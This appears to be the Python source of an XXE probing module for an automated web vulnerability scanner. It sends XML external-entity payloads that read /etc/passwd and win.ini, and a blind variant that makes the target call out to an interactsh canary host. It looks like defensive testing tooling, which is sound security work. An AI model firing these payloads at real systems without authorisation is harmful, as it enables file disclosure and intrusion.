"""XXE agent: sends a raw XML body with an external entity pointing at a
known, harmless-to-read file and checks for its content signature in the
response. Only meaningful against a POST-capable endpoint -- unlike the
other agents this doesn't inject into a named parameter, it replaces the
whole request body. A blind (OOB) variant is sent when interactsh is
configured, but stays unconfirmed/not-found since we can't poll the
callback yet -- same "no exploit, no report" discipline as the SSRF agent.
"""
from __future__ import annotations

import uuid

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent

XXE_PROBES: list[tuple[str, str]] = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "root:",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        "[fonts]",
    ),
]


class XXEAgent(HttpAgent):
    agent_type = "xxe"

    async def run(self) -> AgentResult:
        if self.target is None:
            return self.no_target_result()
        if self.target.method.upper() != "POST":
            return AgentResult(found=False, notes="XXE probing requires a POST-capable endpoint accepting a body")

        url = self.target.url
        for payload, signature in XXE_PROBES:
            try:
                response = await self.client.request(
                    "POST", url, content=payload, headers={"Content-Type": "application/xml"}
                )
            except Exception:
                continue
            if signature in response.text:
                async def recheck(p=payload, sig=signature) -> bool:
                    r = await self.client.request("POST", url, content=p, headers={"Content-Type": "application/xml"})
                    return sig in r.text

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=payload,
                    request=f"POST {url}\nContent-Type: application/xml\nbody: {payload}",
                    response=self._format_response(response),
                    evidence=f"XXE external entity resolved to a local file containing '{signature}'",
                    poc_request=self._poc_request("POST", url, content=payload),
                )

        note = "no XXE confirmed with local file entities"
        if self.context.settings.interactsh_server:
            canary = f"http://{uuid.uuid4().hex[:12]}.{self.context.settings.interactsh_server}/"
            blind_payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{canary}">]><foo>&xxe;</foo>'
            try:
                await self.client.request("POST", url, content=blind_payload, headers={"Content-Type": "application/xml"})
                note += f"; sent OOB canary {canary} (check interactsh for a callback)"
            except Exception:
                pass

        return AgentResult(found=False, notes=note)
